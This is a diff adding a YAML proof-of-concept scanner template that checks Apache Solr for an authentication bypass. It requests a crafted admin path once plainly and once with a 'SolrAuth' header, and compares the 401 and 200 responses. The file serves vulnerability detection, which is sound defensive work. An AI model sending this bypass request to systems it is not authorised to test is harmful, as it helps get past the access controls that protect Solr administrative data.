@@ -1,0 +1,23 @@
+name: poc-yaml-apache-solr-auth-bypass
+manual: true
+transport: http
+rules:
+    r0:
+        request:
+            cache: true
+            method: GET
+            path: /solr/admin/cores:/admin/info/key?indexInfo=false&wt=json
+        expression: response.status == 401
+    r1:
+        request:
+            cache: true
+            method: GET
+            path: /solr/admin/cores:/admin/info/key?indexInfo=false&wt=json
+            headers:
+                SolrAuth: solr1
+        expression: response.status == 200
+expression: r0() && r1()
+detail:
+    author: Greshow
+    links:
+        - https://github.com/Greshow/pocs/blob/main/apache-solr-auth-bypass/README.md
